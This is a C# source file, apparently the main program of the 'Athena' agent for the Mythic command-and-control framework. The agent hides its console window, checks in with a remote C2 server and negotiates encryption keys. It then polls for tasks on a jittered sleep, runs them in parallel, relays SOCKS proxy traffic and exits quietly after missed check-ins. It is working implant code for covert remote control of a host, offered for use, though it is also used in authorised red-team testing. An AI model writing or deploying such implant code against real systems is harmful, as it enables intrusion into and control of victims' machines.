using Athena.Commands;
using Athena.Utilities;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System;
using System.Linq;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Mythic.Response;

namespace Athena
{

    class Program
    {
#if FORCE_HIDE_WINDOW
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
#endif

        /// <summary>
        /// Main loop
        /// </summary>
        static void Main(string[] args)
        {
#if FORCE_HIDE_WINDOW
            //Hide Console Window
            ShowWindow(GetConsoleWindow(), 0);
#endif
            AsyncMain(args).GetAwaiter().GetResult();

        }
        static async Task AsyncMain(string[] args) 
        { 
            int maxMissedCheckins = 10;
            int missedCheckins = 0;
            bool exit = false;

            //MythicClient controls all of the agent communications
            Globals.mc = new MythicClient();

            //First Checkin-In attempt
            CheckinResponse res = await handleCheckin();
            
            if (!await updateAgentInfo(res))
            {
                Environment.Exit(0);
            }

            //We checked in successfully, reset to 0
            missedCheckins = 0;

            //Main Loop
            while (!(missedCheckins == maxMissedCheckins) & !exit)
            {
                try
                {
                    List<MythicJob> hasoutput = Globals.jobs.Values.Where(c => c.hasoutput).ToList();
                    List<DelegateMessage> delegateMessages = Globals.mc.MythicConfig.forwarder.GetMessages();
                    List<SocksMessage> socksMessages = Globals.socksHandler.GetMessages();
                    bool success = await checkAgentTasks(hasoutput, delegateMessages, socksMessages);

                    if (!success)
                    {
                        if (missedCheckins == maxMissedCheckins)
                        {
                            Environment.Exit(0);
                        }
                        foreach (var job in hasoutput)
                        {
                            Globals.jobs.Add(job.task.id, job);
                        }
                        missedCheckins++;
                    }
                    else
                    {
                        missedCheckins = 0;
                        await startAgentJobs();
                        await clearAgentTasks(hasoutput);
                    }
                }
                catch (Exception e)
                {
                    missedCheckins++;
                    if (missedCheckins == maxMissedCheckins)
                    {
                        Environment.Exit(0);
                    }
                }
                await Task.Delay(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter) * 1000);
            }
        }

        /// <summary>
        /// Perform initial checkin with the Mythic server
        /// </summary>
        private static async Task<CheckinResponse> handleCheckin()
        {
            int maxMissedCheckins = 3;
            int missedCheckins = 0;
            CheckinResponse res = await Globals.mc.CheckIn();

            //Run in loop, just in case the agent is not able to connect initially to give a chance for network issues to resolve
            while (res.status != "success")
            {
                //Attempt checkin again
                try
                {
                    //Increment checkins
                    missedCheckins += 1;

                    if (missedCheckins == maxMissedCheckins)
                    {
                        //bye bye
                        Environment.Exit(0);
                    }

                    //Keep Trying
                    res = await Globals.mc.CheckIn();
                }
                catch (Exception e)
                {
                }
                //Sleep before attempting checkin again
                Thread.Sleep(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter) * 1000);
            }
            return res;
        }

        /// <summary>
        /// Update the agent information on successful checkin with the Mythic server
        /// </summary>
        /// <param name="res">CheckIn Response</param>
        private static async Task<bool> updateAgentInfo(CheckinResponse res)
        {
            try
            {
                Globals.mc.MythicConfig.uuid = res.id;
                if (Globals.mc.MythicConfig.currentConfig.encrypted)
                {
                    if (Globals.mc.MythicConfig.currentConfig.encryptedExchangeCheck && !String.IsNullOrEmpty(res.encryption_key))
                    {
                        Globals.mc.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, res.encryption_key);
                    }
                    else
                    {
                        Globals.mc.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, Globals.mc.MythicConfig.currentConfig.psk);
                    }
                }
                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }

        /// <summary>
        /// Perform a check-in with the Mythic server to return current responses and check for new tasks
        /// </summary>
        /// <param name="jobs">List of MythicJobs</param>
        /// <param name="delegateMessages">List of DelegateMessages</param>
        /// <param name="socksMessage">List of SocksMessages</param>
        private static async Task<bool> checkAgentTasks(List<MythicJob> jobs, List<DelegateMessage> delegateMessages, List<SocksMessage> socksMessage)
        {
            List<MythicTask> tasks;
            try
            {
                tasks = await Globals.mc.GetTasks(jobs,delegateMessages,socksMessage);
            }
            catch (Exception e)
            {
                return false;
            }

            if (tasks is not null)
            {
                foreach (var task in tasks)
                {
                    Globals.jobs.Add(task.id, new MythicJob(task));
                }
                return true;
            }
            else
            {
                return false;
            }
        }

        /// <summary>
        /// Kick off jobs received from the Mythic server
        /// </summary>
        private static async Task<bool> startAgentJobs()
        {
            try
            {
                Parallel.ForEach(Globals.jobs, async job =>
                {
                    try
                    {
                        job.Value.started = true;
                        await CommandHandler.StartJob(job.Value);
                    }
                    catch (Exception e)
                    {
                        job.Value.complete = true;
                        job.Value.hasoutput = true;
                        job.Value.taskresult = e.Message;
                        job.Value.errored = true;
                    }
                });
                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }

        /// <summary>
        /// Initialize TCP client with a given server IP address and port number
        /// </summary>
        /// <param name="jobs">List of MythicJobs</param>
        private static async Task clearAgentTasks(List<MythicJob> jobs)
        {
            foreach (var job in jobs)
            {
                try
                {
                    //Check if it's a download or upload job
                    if (!Globals.downloadJobs.ContainsKey(job.task.id) && !Globals.uploadJobs.ContainsKey(job.task.id))
                    {
                        if (job.complete)
                        {
                            Globals.jobs.Remove(job.task.id);
                        }
                        else
                        {
                            string sent = Globals.jobs[job.task.id].taskresult;
                            if (!String.IsNullOrEmpty(Globals.jobs[job.task.id].taskresult))
                            {
                                //Hopefully this fixes the issue with missing text being returned to the server.
                                Globals.jobs[job.task.id].taskresult = Globals.jobs[job.task.id].taskresult.Replace(sent, "");
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                }
            }
        }
    }
}
